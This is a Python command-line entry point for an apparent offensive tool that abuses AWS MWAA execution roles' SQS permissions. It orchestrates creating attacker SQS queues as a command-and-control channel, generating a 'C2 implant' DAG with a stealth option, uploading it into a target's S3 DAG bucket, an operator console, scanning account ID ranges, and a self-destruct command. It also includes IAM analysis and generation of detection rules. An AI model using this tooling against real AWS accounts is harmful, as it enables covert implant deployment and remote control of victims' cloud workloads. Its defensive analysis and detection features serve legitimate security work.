"""
Main CLI entry point for the MWAA SQS Security Testing Tool v2.0.

Usage:
    python -m mwaa_security_tool <command> [options]

Commands:
    deploy      - Deploy C2 infrastructure, generate DAG, upload to S3
    connect     - Interactive C2 operator console
    recon       - Pre-attack account scanning
    analyze     - Blue team IAM analysis & detection
    teardown    - Cleanup queues and optional self-destruct
    test        - End-to-end validation suite
"""

import argparse
import json
import os
import sys

from .config import AttackerConfig, TargetConfig
from .utils import setup_logging, print_banner, print_section, print_success, print_fail, print_info, print_warn


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="mwaa-security-tool",
        description="MWAA SQS Execution Role Security Testing Tool v2.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable debug logging")

    sub = parser.add_subparsers(dest="command", help="Command to run")

    # ── deploy ────────────────────────────────────────────────────
    deploy = sub.add_parser("deploy", help="Deploy C2 infrastructure, generate DAG, upload to S3")
    deploy_sub = deploy.add_subparsers(dest="deploy_action", help="Deploy action")

    # deploy all
    deploy_all = deploy_sub.add_parser("all", help="Full pipeline: create queues + generate DAG + upload to S3")
    deploy_all.add_argument("--attacker-account", required=True, help="Attacker AWS account ID")
    deploy_all.add_argument("--target-bucket", required=True, help="Target S3 DAG bucket")
    deploy_all.add_argument("--target-prefix", default="dags/", help="S3 key prefix (default: dags/)")
    deploy_all.add_argument("--target-profile", default=None, help="AWS profile for S3 upload")
    deploy_all.add_argument("--target-region", default="us-east-1", help="Target S3 bucket region")
    deploy_all.add_argument("--stealth", action="store_true", help="Use innocuous DAG name/tags")
    deploy_all.add_argument("--poll-interval", type=int, default=5, help="C2 poll interval in minutes")
    deploy_all.add_argument("--jitter", type=int, default=0, help="Max random jitter in seconds")
    deploy_all.add_argument("--attacker-region", default="us-east-1", help="Attacker AWS region")
    deploy_all.add_argument("--attacker-profile", default=None, help="Attacker AWS CLI profile")
    deploy_all.add_argument("--output-dir", default="./generated_dags", help="Local output directory for DAG")

    # deploy queues
    deploy_queues = deploy_sub.add_parser("queues", help="Only create attacker SQS queues")
    deploy_queues.add_argument("--attacker-account", required=True, help="Attacker AWS account ID")
    deploy_queues.add_argument("--attacker-region", default="us-east-1", help="Attacker AWS region")
    deploy_queues.add_argument("--attacker-profile", default=None, help="Attacker AWS CLI profile")

    # deploy generate
    deploy_gen = deploy_sub.add_parser("generate", help="Only generate the C2 implant DAG locally")
    deploy_gen.add_argument("--attacker-account", required=True, help="Attacker AWS account ID")
    deploy_gen.add_argument("--output-dir", default="./generated_dags", help="Output directory")
    deploy_gen.add_argument("--stealth", action="store_true", help="Use innocuous DAG name/tags")
    deploy_gen.add_argument("--poll-interval", type=int, default=5, help="C2 poll interval in minutes")
    deploy_gen.add_argument("--jitter", type=int, default=0, help="Max random jitter in seconds")
    deploy_gen.add_argument("--attacker-region", default="us-east-1", help="Attacker AWS region")
    deploy_gen.add_argument("--attacker-profile", default=None, help="Attacker AWS CLI profile")

    # deploy upload
    deploy_upload = deploy_sub.add_parser("upload", help="Only upload an existing DAG file to target S3")
    deploy_upload.add_argument("--file", required=True, help="Local DAG file path")
    deploy_upload.add_argument("--target-bucket", required=True, help="Target S3 bucket")
    deploy_upload.add_argument("--target-prefix", default="dags/", help="S3 key prefix")
    deploy_upload.add_argument("--target-profile", default=None, help="AWS profile for S3 upload")
    deploy_upload.add_argument("--target-region", default="us-east-1", help="S3 bucket region")

    # ── connect ───────────────────────────────────────────────────
    connect = sub.add_parser("connect", help="Interactive C2 operator console")
    connect.add_argument("--attacker-account", required=True, help="Attacker AWS account ID")
    connect.add_argument("--attacker-region", default="us-east-1", help="Attacker AWS region")
    connect.add_argument("--attacker-profile", default=None, help="Attacker AWS CLI profile")

    # ── recon ─────────────────────────────────────────────────────
    recon = sub.add_parser("recon", help="Pre-attack account scanning")
    recon_group = recon.add_mutually_exclusive_group(required=True)
    recon_group.add_argument("--accounts", help="Comma-separated account IDs or file path")
    recon_group.add_argument("--start", type=int, help="Starting account ID for range scan")
    recon.add_argument("--count", type=int, default=100, help="Number of accounts for range scan")
    recon.add_argument("--region", default="us-east-1", help="Region to scan")
    recon.add_argument("--source-profile", default=None, help="AWS profile for scanning")
    recon.add_argument("--source-region", default=None, help="AWS region for source profile")
    recon.add_argument("--threads", type=int, default=5, help="Concurrent threads")

    # ── analyze ───────────────────────────────────────────────────
    analyze = sub.add_parser("analyze", help="IAM policy analysis & detection")
    analyze_sub = analyze.add_subparsers(dest="action")

    analyze_role = analyze_sub.add_parser("role", help="Analyze a specific IAM role")
    analyze_role.add_argument("--role-name", required=True, help="IAM role name")
    analyze_role.add_argument("--region", default="us-east-1")
    analyze_role.add_argument("--profile", default=None)

    analyze_enum = analyze_sub.add_parser("enumerate", help="Enumerate MWAA environments and roles")
    analyze_enum.add_argument("--region", default="us-east-1")
    analyze_enum.add_argument("--profile", default=None)

    analyze_full = analyze_sub.add_parser("full", help="Full assessment (enumerate + analyze all)")
    analyze_full.add_argument("--region", default="us-east-1")
    analyze_full.add_argument("--profile", default=None)

    analyze_detect = analyze_sub.add_parser("detection-rules", help="Generate detection rules")
    analyze_detect.add_argument("--output-dir", default="./detection_rules", help="Output directory")

    # ── teardown ──────────────────────────────────────────────────
    teardown = sub.add_parser("teardown", help="Cleanup queues and optional self-destruct")
    teardown.add_argument("--attacker-account", required=True, help="Attacker AWS account ID")
    teardown.add_argument("--self-destruct", action="store_true",
                          help="Also send !self-destruct to the implant before cleanup")
    teardown.add_argument("--attacker-region", default="us-east-1", help="Attacker AWS region")
    teardown.add_argument("--attacker-profile", default=None, help="Attacker AWS CLI profile")

    # ── test ──────────────────────────────────────────────────────
    test = sub.add_parser("test", help="End-to-end validation suite")
    test.add_argument("--attacker-account", required=True, help="Attacker AWS account ID")
    test.add_argument("--attacker-region", default="us-east-1", help="Attacker AWS region")
    test.add_argument("--attacker-profile", default=None, help="Attacker AWS CLI profile")
    test.add_argument("--source-profile", default=None, help="AWS profile simulating MWAA execution role")
    test.add_argument("--source-region", default=None, help="AWS region for source profile")

    return parser


# ── Command handlers ──────────────────────────────────────────────

def cmd_deploy(args, parser):
    from .modules import c2_channel, dag_generator

    if args.deploy_action == "all":
        attacker = AttackerConfig(
            account_id=args.attacker_account,
            region=args.attacker_region,
            profile=args.attacker_profile,
        )
        # 1. Create queues
        c2_channel.setup_c2_infra(attacker)

        # 2. Generate DAG
        output_dir = args.output_dir
        os.makedirs(output_dir, exist_ok=True)
        output_path = os.path.join(output_dir, "dag_c2_implant.py")
        dag_code = dag_generator.generate_c2_implant_dag(
            attacker,
            poll_interval_minutes=args.poll_interval,
            jitter_seconds=args.jitter,
            stealth=args.stealth,
            output_path=output_path,
        )

        # 3. Upload to S3
        target = TargetConfig(
            s3_dag_bucket=args.target_bucket,
            s3_dag_prefix=args.target_prefix,
            region=args.target_region,
            profile=args.target_profile,
        )
        dag_generator.upload_dag_to_s3(target, dag_code, "dag_c2_implant.py")

    elif args.deploy_action == "queues":
        attacker = AttackerConfig(
            account_id=args.attacker_account,
            region=args.attacker_region,
            profile=args.attacker_profile,
        )
        c2_channel.setup_c2_infra(attacker)

    elif args.deploy_action == "generate":
        attacker = AttackerConfig(
            account_id=args.attacker_account,
            region=args.attacker_region,
            profile=args.attacker_profile,
        )
        output_dir = args.output_dir
        os.makedirs(output_dir, exist_ok=True)
        output_path = os.path.join(output_dir, "dag_c2_implant.py")
        dag_generator.generate_c2_implant_dag(
            attacker,
            poll_interval_minutes=args.poll_interval,
            jitter_seconds=args.jitter,
            stealth=args.stealth,
            output_path=output_path,
        )

    elif args.deploy_action == "upload":
        with open(args.file) as f:
            dag_code = f.read()
        target = TargetConfig(
            s3_dag_bucket=args.target_bucket,
            s3_dag_prefix=args.target_prefix,
            region=args.target_region,
            profile=args.target_profile,
        )
        dag_generator.upload_dag_to_s3(target, dag_code, os.path.basename(args.file))

    else:
        parser.parse_args(["deploy", "-h"])


def cmd_connect(args):
    from .modules import c2_channel
    attacker = AttackerConfig(
        account_id=args.attacker_account,
        region=args.attacker_region,
        profile=args.attacker_profile,
    )
    c2_channel.operator_console(attacker)


def cmd_recon(args):
    from .modules import recon as recon_mod

    if args.accounts:
        # Comma-separated list or file path
        if os.path.isfile(args.accounts):
            with open(args.accounts) as f:
                account_ids = [line.strip() for line in f if line.strip()]
        else:
            account_ids = [a.strip() for a in args.accounts.split(",")]

        recon_mod.run_recon(
            account_ids=account_ids,
            region=args.region,
            source_profile=args.source_profile,
            source_region=args.source_region,
            threads=args.threads,
        )
    elif args.start is not None:
        recon_mod.scan_account_range(
            start_account=args.start,
            count=args.count,
            region=args.region,
            source_profile=args.source_profile,
            source_region=args.source_region,
            threads=args.threads,
        )


def cmd_analyze(args, parser):
    from .modules import policy_analyzer

    if args.action == "role":
        policy_analyzer.analyze_role(args.role_name, args.region, args.profile)
    elif args.action == "enumerate":
        policy_analyzer.enumerate_mwaa_environments(args.region, args.profile)
    elif args.action == "full":
        policy_analyzer.full_assessment(args.region, args.profile)
    elif args.action == "detection-rules":
        output_dir = args.output_dir
        os.makedirs(output_dir, exist_ok=True)

        rule = policy_analyzer.generate_config_guard_rule()
        rule_path = os.path.join(output_dir, "mwaa_sqs_wildcard.guard")
        with open(rule_path, "w") as f:
            f.write(rule)
        print_success(f"Config Guard rule: {rule_path}")

        queries = policy_analyzer.generate_cloudwatch_detection_queries()
        queries_path = os.path.join(output_dir, "cloudwatch_queries.json")
        with open(queries_path, "w") as f:
            json.dump(queries, f, indent=2)
        print_success(f"CloudWatch queries: {queries_path}")
    else:
        parser.parse_args(["analyze", "-h"])


def cmd_teardown(args):
    from .modules import c2_channel
    attacker = AttackerConfig(
        account_id=args.attacker_account,
        region=args.attacker_region,
        profile=args.attacker_profile,
    )

    if args.self_destruct:
        print_section("Self-Destruct")
        print_info("Sending !self-destruct to implant...")
        try:
            c2_channel.send_command(attacker, "!self-destruct")
            print_success("Self-destruct command sent. Implant will remove itself on next poll.")
        except Exception as e:
            print_warn(f"Could not send self-destruct (queues may already be gone): {e}")

    c2_channel.cleanup(attacker)


def cmd_test(args):
    from .modules import c2_channel, dos_simulation, event_injection, recon

    attacker = AttackerConfig(
        account_id=args.attacker_account,
        region=args.attacker_region,
        profile=args.attacker_profile,
    )

    print_section("CAPABILITY TEST SUITE")
    print_info("Running all safe tests using attacker account as both source and target.")
    print_info("No real MWAA environment is required.\n")

    results = {}

    # 1. C2 Channel
    print_section("Test 1/4: C2 Channel")
    try:
        c2_channel.setup_c2_infra(attacker)
        results["c2_channel"] = c2_channel.test_c2_roundtrip(
            attacker,
            source_profile=args.source_profile,
            source_region=args.source_region,
        )
        c2_channel.cleanup(attacker)
    except Exception as e:
        print_fail(f"C2 test error: {e}")
        results["c2_channel"] = False

    # 2. DoS Assessment
    print_section("Test 2/4: DoS Assessment")
    try:
        dos_results = dos_simulation.assess_dos_risk(
            attacker,
            source_profile=args.source_profile,
            source_region=args.source_region,
        )
        results["dos"] = all(dos_results.values())
    except Exception as e:
        print_fail(f"DoS assessment error: {e}")
        results["dos"] = False

    # 3. Event Injection
    print_section("Test 3/4: Event Injection")
    try:
        results["event_injection"] = event_injection.test_injection_safe(
            attacker,
            source_profile=args.source_profile,
            source_region=args.source_region,
        )
    except Exception as e:
        print_fail(f"Injection test error: {e}")
        results["event_injection"] = False

    # 4. Recon
    print_section("Test 4/4: Infrastructure Reconnaissance")
    try:
        results["recon"] = recon.test_recon_capability(
            attacker,
            source_profile=args.source_profile,
            source_region=args.source_region,
        )
    except Exception as e:
        print_fail(f"Recon test error: {e}")
        results["recon"] = False

    # Final Report
    print_section("TEST RESULTS")
    all_pass = True
    for test_name, passed in results.items():
        if passed:
            print_success(f"{test_name}: PASS")
        else:
            print_fail(f"{test_name}: FAIL")
            all_pass = False

    print()
    if all_pass:
        print_warn("ALL TESTS PASSED: The MWAA execution role SQS policy is fully exploitable.")
        print_warn("All 4 attack vectors (C2, DoS, injection, recon) are viable.")
    else:
        passed_count = sum(1 for v in results.values() if v)
        print_info(f"{passed_count}/{len(results)} tests passed.")


def main():
    parser = build_parser()
    args = parser.parse_args()

    setup_logging(args.verbose)
    print_banner()

    if args.command == "deploy":
        cmd_deploy(args, parser)
    elif args.command == "connect":
        cmd_connect(args)
    elif args.command == "recon":
        cmd_recon(args)
    elif args.command == "analyze":
        cmd_analyze(args, parser)
    elif args.command == "teardown":
        cmd_teardown(args)
    elif args.command == "test":
        cmd_test(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
